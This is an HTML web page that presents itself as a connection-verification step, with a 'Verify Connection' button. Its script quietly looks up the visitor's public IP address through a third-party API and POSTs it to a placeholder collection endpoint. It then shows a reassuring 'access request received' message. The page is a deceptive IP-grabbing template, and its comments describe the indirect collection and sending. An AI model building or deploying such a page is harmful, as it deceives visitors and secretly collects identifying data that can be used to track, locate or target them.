<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Access Request</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      animation: gradientBG 15s ease infinite;
      background-size: 400% 400%;
    }
    
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .container {
      padding: 2rem;
      background: rgba(0,0,0,0.3);
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
      max-width: 500px;
      width: 90%;
    }
    
    button {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s;
      margin-top: 20px;
    }
    
    button:hover {
      background: #45a049;
      transform: translateY(-2px);
    }
    
    button:disabled {
      background: #cccccc;
      cursor: not-allowed;
    }
    
    #status {
      margin-top: 20px;
      min-height: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Request Access</h1>
    <p>Click below to verify your connection</p>
    <button id="requestBtn" onclick="requestAccess()">Verify Connection</button>
    <div id="status"></div>
  </div>

  <script>
    async function requestAccess() {
      const btn = document.getElementById('requestBtn');
      const status = document.getElementById('status');
      
      btn.disabled = true;
      status.textContent = "Processing request...";
      
      try {
        // Get IP through indirect method
        const ipResponse = await fetch('https://api.db-ip.com/v2/free/self');
        if (!ipResponse.ok) throw new Error("Network response was not ok");
        
        const data = await ipResponse.json();
        const ipAddress = data.ipAddress;
        
        // Send through a form submission style
        status.textContent = "Completing verification...";
        
        const formData = new FormData();
        formData.append('ip', ipAddress);
        
        // Using a proxy endpoint (you would need to create this)
        const response = await fetch('https://your-proxy-endpoint.example.com/submit', {
          method: 'POST',
          body: formData
        });
        
        if (!response.ok) throw new Error("Verification failed");
        
        status.textContent = "âœ“ Access request received!";
        btn.textContent = "Request Submitted";
      } catch (error) {
        console.error("Error:", error);
        status.textContent = "Error: Please try again later";
        btn.disabled = false;
        btn.textContent = "Try Again";
      }
    }
  </script>
</body>
</html>
